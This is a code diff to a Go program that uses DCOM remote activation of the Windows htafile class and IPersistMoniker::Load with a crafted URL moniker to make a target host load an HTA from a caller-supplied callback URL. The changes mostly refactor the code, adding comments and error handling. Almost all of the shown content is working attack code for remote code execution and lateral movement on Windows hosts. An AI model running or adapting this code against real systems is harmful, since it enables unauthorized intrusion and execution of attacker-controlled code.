@@ -7,6 +7,7 @@ package main
 import (
 	"context"
 	"encoding/binary"
+	"errors"
 	"flag"
 	"fmt"
 	"net"
@@ -58,10 +59,9 @@ var (
 	callback string
 	target   string
 
-	serialGUID         = dtyp.GUIDFromUUID(uuid.MustParse("F4815879-1D3B-487F-AF2C-825DC4852763"))
-	htafileClassID     = (*dcom.ClassID)(dtyp.GUIDFromUUID(uuid.MustParse("3050F4D8-98B5-11CF-BB82-00AA00BDCE0B")))
-	urlMonikerClassID  = (*dcom.ClassID)(dtyp.GUIDFromUUID(uuid.MustParse("79EAC9E0-BAF9-11CE-8C82-00AA004BA90B")))
-	iPersistMonikerIID = dcom.IID(*dtyp.GUIDFromUUID(uuid.MustParse("79EAC9C9-BAF9-11CE-8C82-00AA004BA90B")))
+	serialGUID        = dtyp.GUIDFromUUID(uuid.MustParse("F4815879-1D3B-487F-AF2C-825DC4852763"))
+	htafileClassID    = (*dcom.ClassID)(dtyp.GUIDFromUUID(uuid.MustParse("3050F4D8-98B5-11CF-BB82-00AA00BDCE0B")))
+	urlMonikerClassID = (*dcom.ClassID)(dtyp.GUIDFromUUID(uuid.MustParse("79EAC9E0-BAF9-11CE-8C82-00AA004BA90B")))
 )
 
 func init() {
@@ -95,29 +95,33 @@ func main() {
 	if err != nil {
 		panic(err)
 	}
-	defer cc.Close(ctx)
+	defer func() {
+		if cc != nil {
+			cc.Close(ctx)
+		}
+	}()
 
-	// new object exporter client.
+	// Create an object exporter client.
 	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), dcerpc.WithTargetName(target))
 	if err != nil {
 		panic(err)
 	}
-	// server-alive to determine the bindings.
+	// Call ServerAlive2 to determine the bindings & COM version.
 	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
 	if err != nil {
 		panic(err)
 	}
-	// new activation-client.
+	// Create an activation client.
 	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), dcerpc.WithTargetName(target))
 	if err != nil {
 		panic(err)
 	}
 
-	// activate the WMI interface.
+	// Perform remote activation.
 	act, err := iact.RemoteActivation(ctx, &iactivation.RemoteActivationRequest{
 		ORPCThis: &dcom.ORPCThis{Version: srv.COMVersion},
 		ClassID:  htafileClassID.GUID(),
-		IIDs:     []*dcom.IID{&iPersistMonikerIID},
+		IIDs:     []*dcom.IID{ipersistmoniker.PersistMonikerIID},
 		// for TCP/IP it must be []uint16{7} / for named pipes: []uint16{15}.
 		RequestedProtocolSequences: []uint16{7, 15},
 	})
@@ -126,36 +130,45 @@ func main() {
 	}
 	if act.HResult != 0 {
 		fmt.Fprintln(os.Stderr, hresult.FromCode(uint32(act.HResult)))
-		return
+		os.Exit(1)
 	}
 	if err != nil {
 		panic(err)
 	}
-	ipid := act.InterfaceData[0].GetStandardObjectReference().Std.IPID
+	ipid := act.InterfaceData[0].GetStandardObjectReference().Std.IPID // Activated instance ID
 
+	// Dial activated instance
 	cc, err = dcerpc.Dial(ctx, target,
 		append(act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp"), dcerpc.WithSign(), dcom.WithIPID(ipid))...)
 	if err != nil {
 		panic(err)
 	}
+	// Create IPersistMoniker client.
 	ipmc, err := ipersistmoniker.NewPersistMonikerClient(ctx, cc, dcom.WithIPID(ipid))
 	if err != nil {
 		panic(err)
 	}
+	// Craft wrapped URL Moniker
 	mon, err := getUrlMoniker(callback, UriCreateCanonicalize|UriCreateCrackUnknownSchemes)
 	if err != nil {
 		panic(err)
 	}
+	// Load crafted URL Moniker
 	lrs, err := ipmc.Load(ctx, &ipersistmoniker.LoadRequest{
 		This: &dcom.ORPCThis{Version: srv.COMVersion},
 		Name: mon,
 	})
 	if err != nil {
-		panic(err)
+		// Example of how to handle URL Moniker related errors.
+		if errors.Is(err, hresult.InetEInvalidUrl) {
+			fmt.Fprintln(os.Stderr, "Server reported invalid URL:", callback)
+		}
 	}
 	_ = lrs
 }
 
+// URLMoniker represents the relevant fields of a URL Moniker.
+// See https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-oshared/4948a119-c4e4-46b6-9609-0525118552e8
 type URLMoniker struct {
 	URL           string
 	HasExtras     bool   // whether to include trailer with SerialGUID/SerialVersion/URIFlags on marshal
@@ -181,11 +194,11 @@ func (m URLMoniker) MarshalBinary() ([]byte, error) {
 	}
 	binary.LittleEndian.PutUint32(out, uint32(len(out)-4))
 	copy(out[4:], urlBytes)
-	copy(out[4+len(urlBytes):], m.URL)
 
 	return out, nil
 }
 
+// getUrlMoniker returns a wrapped URL Moniker for the given URL string.
 func getUrlMoniker(url string, flags uint32) (*urlmon.Moniker, error) {
 	blob, err := URLMoniker{URL: url, HasExtras: true, URIFlags: flags}.MarshalBinary()
 	if err != nil {
